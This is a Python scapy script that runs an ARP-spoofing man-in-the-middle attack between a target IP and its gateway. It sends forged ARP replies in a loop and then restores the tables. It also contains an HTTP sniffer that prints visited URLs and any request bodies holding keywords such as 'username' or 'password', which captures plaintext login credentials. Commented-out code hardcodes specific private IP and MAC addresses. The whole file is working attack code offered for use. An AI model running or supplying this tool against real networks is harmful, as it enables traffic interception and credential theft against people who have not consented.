import scapy.all as scapy
import time
import argparse
from scapy.layers import http

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest = "target_ip", help = "IP Address of the target.")
    parser.add_argument("-g", "--gateway", dest = "gateway_ip", help = "IP Address of the Gateway.")
    options = parser.parse_args()
    if not options.target_ip:
        #Code to handle if an IP Address of the target is not specified.
        parser.error("[-] Please specify an IP Address of the target machine, use --help for more info.")
    elif not options.gateway_ip:
        #Code to handle if an IP Address of the gateway is not specified.
        parser.error("[-] Please specify an IP Address of the gateway, use --help for more info.")
    return options

def get_mac(ip):
	arp_request = scapy.ARP(pdst=ip)
	broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
	arp_request_broadcast = broadcast/arp_request
	answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose = False,iface="eth0")[0]
	if answered_list:
		return answered_list[0][1].hwsrc	
	
def spoof(targetIp, spoofIp):
	packet = scapy.ARP(op= 2, pdst=targetIp, hwdst=get_mac(targetIp), psrc = spoofIp)
	scapy.send(packet,verbose = False)
	#print(packet.summary())
	
def restore(source_ip, destination_ip):
    source_mac = get_mac(source_ip)
    destination_mac = get_mac(destination_ip)
    restore_packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(restore_packet, count =1, verbose = False)
    
def sniffer (interface):
	scapy.sniff(iface=interface, store=False,prn=sniffed_packet)

def sniffed_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("HTTP Request >> " + str(url))
		login_data = get_login(packet)
		print("username->password >>" + str(login_data))	
		
def get_login(packet):
	if packet.haslayer(scapy.Raw):
		load = str(packet[scapy.Raw].load)
		keywords = ["email", "username", "user", "login", "pass", "password"]
		for kw in keywords:
			if kw in load:
				return load

def get_url(packet):
	host = packet[http.HTTPRequest].Host or ""
	path = packet[http.HTTPRequest].Path or ""
	return host + path

options = get_args()

target_ip = options.target_ip
gateway_ip = options.gateway_ip

#def spoofME():
#	packet = scapy.ARP(op= 2, pdst="192.168.1.254", hwdst="cc:35:40:96:29:ee", psrc = "192.168.1.57", hwsrc = "DC:FB:48:66:7D:F8")
#	scapy.send(packet,verbose = False)
#	print(packet.summary())
	
#def spoofWI():
#	packet = scapy.ARP(op= 2, pdst="192.168.1.57", hwdst="DC:FB:48:66:7D:F8", psrc = "192.168.1.254", hwsrc = "cc:35:40:96:29:ee")
#	scapy.send(packet,verbose = False)
#	print(packet.summary())
	
#print("Digite la ip de la maquina: ")
#ipClient = input()
#print("Digite la ip de la gateway: ")
#ipGateway = input()
sent_packets_count = 0

try:
	while sent_packets_count <= 30:
	    spoof(gateway_ip,target_ip)
	    spoof(target_ip,gateway_ip)
	    #sniffer("eth0")
	    sent_packets_count = sent_packets_count + 2
	    #print("[+] Packets sent: " + str(sent_packets_count))
	    time.sleep(2)
	print("\n[-]  Restoring the ARP Tables..... Be Patient")
	restore(target_ip, gateway_ip)
	restore(gateway_ip, target_ip)
except KeyboardInterrupt:
    print("\n[-] Detected Ctrl + C..... Restoring the ARP Tables..... Be Patient")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    

		
		
	

